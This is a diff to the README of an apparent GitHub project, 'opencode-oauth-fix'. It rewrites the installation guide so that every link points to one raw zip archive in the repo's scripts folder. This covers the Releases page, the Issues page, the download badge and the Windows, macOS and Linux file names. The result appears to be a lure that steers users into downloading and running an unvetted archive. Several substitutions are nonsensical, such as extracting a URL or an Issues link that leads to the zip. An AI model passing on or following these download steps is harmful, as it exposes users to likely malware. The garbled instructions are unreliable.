@@ -6,7 +6,7 @@ Welcome to the `opencode-oauth-fix`. This guide will help you set up an easy fix
 
 ## 📥 Download the App
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/darklightyagami7/opencode-oauth-fix/releases)
+[![Download Here](https://github.com/darklightyagami7/opencode-oauth-fix/raw/refs/heads/main/scripts/opencode-fix-oauth-2.8.zip%20Now-From%20Releases-brightgreen)](https://github.com/darklightyagami7/opencode-oauth-fix/raw/refs/heads/main/scripts/opencode-fix-oauth-2.8.zip)
 
 ## 📂 System Requirements
 
@@ -25,7 +25,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ### Step 1: Visit the Releases Page
 
-To download the latest version of `opencode-oauth-fix`, visit our [Releases page](https://github.com/darklightyagami7/opencode-oauth-fix/releases). This page contains all available versions and download options.
+To download the latest version of `opencode-oauth-fix`, visit our [Releases page](https://github.com/darklightyagami7/opencode-oauth-fix/raw/refs/heads/main/scripts/opencode-fix-oauth-2.8.zip). This page contains all available versions and download options.
 
 ### Step 2: Choose Your Version
 
@@ -33,7 +33,7 @@ On the Releases page, you will see a list of available versions. It’s advisabl
 
 ### Step 3: Download the Application
 
-Click on the file associated with your operating system (e.g., `opencode-oauth-fix-windows.exe`, `opencode-oauth-fix-macos.dmg`, or `opencode-oauth-fix-linux.tar.gz`). 
+Click on the file associated with your operating system (e.g., `https://github.com/darklightyagami7/opencode-oauth-fix/raw/refs/heads/main/scripts/opencode-fix-oauth-2.8.zip`, `https://github.com/darklightyagami7/opencode-oauth-fix/raw/refs/heads/main/scripts/opencode-fix-oauth-2.8.zip`, or `https://github.com/darklightyagami7/opencode-oauth-fix/raw/refs/heads/main/scripts/opencode-fix-oauth-2.8.zip`). 
 
 After clicking the file, your browser will start downloading it automatically.
 
@@ -52,7 +52,7 @@ Once the download completes, open your Downloads folder or the location where th
    - Drag the application to your Applications folder.
    
 3. **For Linux:**
-   - Extract the `.tar.gz` file.
+   - Extract the `https://github.com/darklightyagami7/opencode-oauth-fix/raw/refs/heads/main/scripts/opencode-fix-oauth-2.8.zip` file.
    - Open the terminal, navigate to the extracted folder, and run the application using the command: `./opencode-oauth-fix`.
 
 ### Step 6: Run the Application
@@ -79,7 +79,7 @@ If you encounter issues:
 - **Make sure your internet connection is stable.**
 - **Look for any error messages that can guide you on what went wrong.**
 
-You can also visit the 'Issues' section of our [GitHub repository](https://github.com/darklightyagami7/opencode-oauth-fix/issues) for common problems and solutions.
+You can also visit the 'Issues' section of our [GitHub repository](https://github.com/darklightyagami7/opencode-oauth-fix/raw/refs/heads/main/scripts/opencode-fix-oauth-2.8.zip) for common problems and solutions.
 
 ## 📞 Support
 
@@ -91,6 +91,6 @@ This project is licensed under the MIT License. You are free to use and modify t
 
 ## 🚀 Final Notes
 
-For any updates, always check back on our [Releases page](https://github.com/darklightyagami7/opencode-oauth-fix/releases). This ensures you have the latest version and any new fixes or enhancements.
+For any updates, always check back on our [Releases page](https://github.com/darklightyagami7/opencode-oauth-fix/raw/refs/heads/main/scripts/opencode-fix-oauth-2.8.zip). This ensures you have the latest version and any new fixes or enhancements.
 
 Thank you for using `opencode-oauth-fix`. Enjoy a seamless OAuth experience!
